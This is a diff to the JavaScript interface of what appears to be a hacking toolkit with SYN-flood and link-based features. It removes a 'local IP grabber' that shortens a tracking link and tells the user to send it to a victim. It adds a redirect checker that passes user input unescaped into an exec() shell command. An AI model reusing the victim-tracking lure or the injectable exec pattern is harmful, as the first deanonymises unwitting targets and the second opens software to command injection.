@@ -43,7 +43,7 @@ function download(fileName, textareaID) {
 
 //Default base of file path
 let pathBase = process.resourcesPath;
-const development = false;
+const development = true;
 if(development){
     pathBase = "./python";
 }
@@ -276,26 +276,18 @@ if(document.getElementById("synFloodStartBtn")) {
     });
 }
 
-if(document.getElementById("localIpGrabberBtn")) {
-    let server;
-    document.getElementById("localIpGrabberBtn").addEventListener("click", () => {
-        const output = document.getElementById("localIpGrabberOutput");
-        const redirectUrl = document.getElementById("localIpGrabberRedirect");
-
-        if(server != undefined) {
-            server.close()
-        }
-        const url = `https://zhiftydk.github.io/getlocalip?ws=ws://${ip.address()}:3000&r=${redirectUrl.value}`;
-        console.log(url)
-        const tinyurl = new prettylink.TinyURL();
-        tinyurl.short(url).then(url => {
-            output.value += `Send this url to the victim: ${url}\r\n`;
+if(document.getElementById("redirectDetectorBtn")) {
+    document.getElementById("redirectDetectorBtn").addEventListener("click", () => {
+        const output = document.getElementById("redirectDetectorOutput");
+        const url = document.getElementById("redirectDetectorURL");
+        output.value = "";
+        const py = exec(`py ${pathBase}/RedirectDetector.py "${url.value}"`);
+        py.stdout.on('data', (data) => {
+            output.value += data;
+            output.scrollTop = output.scrollHeight;
         });
-        // server = app.listen(3000, () => {
-            
-        // });
     });
-    document.getElementById("localIpGrabberSave").addEventListener("click", () => {
-        download("localipgrabberlog", "localIpGrabberOutput");
+    document.getElementById("redirectDetectorSave").addEventListener("click", () => {
+        download("redirectDetectorlog", "redirectDetectorOutput");
     });
 }
